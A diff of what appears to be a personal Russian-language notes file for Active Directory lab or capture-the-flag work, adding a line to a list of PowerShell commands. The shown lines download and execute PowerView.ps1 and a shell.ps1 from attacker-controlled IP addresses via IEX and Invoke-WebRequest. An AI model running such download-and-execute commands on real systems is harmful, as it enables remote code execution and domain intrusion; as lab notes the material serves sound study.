@@ -9,7 +9,7 @@ https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/
 загрузиь повервью в память
 
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')
-
+iex(iwr -usebasicparsing http://192.168.50.123/Powerview.ps1)
 "powershell "IEX(New-Object Net.WebClient).downloadString(''http://10.10.14.9/shell.ps1'')""   ---Бывает и так!!!!!
 
 Поскольку у нас нет оболочки для JDgodd, мы можем использовать PowerShell.
